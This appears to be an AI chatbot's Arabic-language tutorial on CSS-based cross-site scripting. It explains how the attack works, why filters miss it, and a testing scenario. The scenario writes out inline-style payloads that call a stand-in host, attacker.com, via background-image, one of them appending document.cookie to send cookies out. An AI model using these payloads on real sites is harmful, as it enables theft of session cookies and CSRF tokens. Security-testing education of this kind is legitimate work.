بناءً على طلبك لشرح **الحقن المستخدمة في XSS القائم على CSS (CSS-Based XSS)** باستخدام نفس طريقة الشرح المقدمة (التي تتضمن أقسامًا مثل "ما المقصود؟"، "لماذا يعمل؟"، "كيف يتم الاستغلال؟"، والخطوات العملية)، سأقدم شرحًا مفصلاً ومنظمًا لهذه الخطوة في اختبار ثغرات Cross-Site Scripting (XSS). سأغطي جميع المحاولات الممكنة لاستغلال ثغرة XSS باستخدام تقنيات **CSS**، مع التركيز على استغلال خصائص وتعبيرات CSS لتنفيذ JavaScript أو استخراج بيانات حساسة. سيتم تقسيم المحاولات إلى فئات (مثل استخدام تعبيرات CSS، خصائص الخلفية، وتسريب البيانات عبر CSS). سيتم تضمين المحتوى في علامة `<xaiArtifact>` كما هو مطلوب، مع معرف جديد لأن هذا طلب مستقل يركز على خطوة محددة. سأحافظ على الشرح باللغة العربية بأسلوب واضح ومنظم، متجنبًا تنسيق Markdown خارج العلامة بناءً على طلبك السابق.

---

## فهم الخطوة: الحقن المستخدمة في XSS القائم على CSS (CSS-Based XSS)

### ما المقصود؟
الحقن المستخدمة في **XSS القائم على CSS** هي تقنيات تستغل خصائص أو تعبيرات CSS (Cascading Style Sheets) لتنفيذ شيفرات JavaScript أو استخراج بيانات حساسة من صفحة ويب دون الحاجة إلى وسوم HTML تقليدية مثل `<script>` أو `<img>`. تُستخدم هذه الحقن في سياقات **XSS المنعكس**، **XSS المخزن**، أو **XSS القائم على DOM**، حيث يُسمح بإدخال CSS (مثل في حقل نصي، ملف CSS، أو خاصية `style`) دون تنظيف كافٍ. تشمل هذه الحقن استخدام خصائص CSS مثل `background-image`، `content`، أو تعبيرات قديمة مثل `expression()` لتنفيذ JavaScript، أو تسريب بيانات مثل قيم السمات أو النصوص عبر طلبات شبكة.

### لماذا يعمل؟
- **دعم المتصفحات لـ CSS**: تدعم المتصفحات خصائص CSS التي يمكن أن تتضمن روابط URL (مثل `background-image`) أو تعبيرات ديناميكية (مثل `expression()` في Internet Explorer القديم)، مما يتيح تنفيذ JavaScript أو إرسال بيانات.
- **ضعف التنظيف**: العديد من التطبيقات لا تُنظف إدخالات CSS بشكل صحيح، خاصة إذا سُمح بإدخال أنماط في حقول نصية، خصائص `style`، أو ملفات CSS.
- **تسريب البيانات عبر CSS**: يمكن لـ CSS الوصول إلى قيم السمات (مثل `value` أو `data-*`) أو النصوص باستخدام خصائص مثل `content` أو تقنيات مثل CSS selectors، وإرسالها عبر طلبات URL.
- **تجاوز الفلاتر**: تُستخدم تقنيات CSS لتجاوز فلاتر XSS التي تحظر وسوم HTML/JavaScript التقليدية، حيث تُعتبر CSS "آمنة" نسبيًا في بعض السياقات.
- **التفاعل مع DOM**: يمكن لـ CSS التفاعل مع DOM عبر selectors أو خصائص ديناميكية، مما يتيح استخراج بيانات حساسة (مثل رموز الجلسة أو قيم الإدخال).

### كيف يتم الاستغلال؟
- يتم إدخال شيفرة CSS تحتوي على تعبيرات أو خصائص ضارة في نقطة إدخال عرضة لـ XSS (مثل حقل نصي، خاصية `style`، معلمة URL، أو ملف CSS).
- تُصمم الحقنة لتنفيذ JavaScript مباشرة (مثل عبر `expression()` في المتصفحات القديمة) أو لتسريب بيانات عبر طلبات شبكة (مثل `background-image` مع URL يحتوي على بيانات).
- تُستخدم الحقنة لأغراض مثل:
  - تنفيذ JavaScript لسرقة ملفات تعريف الارتباط أو التلاعب بالصفحة.
  - استخراج قيم السمات أو النصوص (مثل رموز CSRF أو قيم حقول الإدخال).
  - تتبع تفاعلات المستخدم (مثل النقرات أو حركة المؤشر).
- يتم مراقبة خادم خارجي (للبيانات المسربة) أو استجابة المتصفح لتأكيد التنفيذ:
  - **نجاح (True)**: الشيفرة تُنفذ (مثل تنفيذ JavaScript أو إرسال بيانات إلى خادم المهاجم).
  - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، قيود CSP، أو عدم دعم المتصفح.
- تُكيَّف الحقن لتجاوز القيود (مثل استخدام خصائص CSS غير شائعة أو تعتيم الشيفرة).

### السناريو
لنفترض أنك تختبر موقعًا إلكترونيًا يحتوي على حقل وصف في ملف تعريف المستخدم يسمح بإدخال CSS عبر خاصية `style` أو حقل نصي يُعرض كنمط. لاحظت أن الموقع لا يُنظف إدخالات CSS بشكل صحيح، ويمكن إدخال شيفرة مثل `<div style="background-image:url('http://attacker.com/log')">` لإرسال طلب إلى خادمك. تريد الآن استخدام حقنة CSS مثل `<div style="background-image:url('http://attacker.com/log?d='+document.cookie)">` أو تقنية تسريب بيانات عبر selectors لاستخراج بيانات حساسة مثل قيم حقول الإدخال أو رموز CSRF. إذا تلقى خادمك البيانات أو نُفذت الشيفرة، فهذا يؤكد وجود ثغرة XSS قائمة على CSS.

---
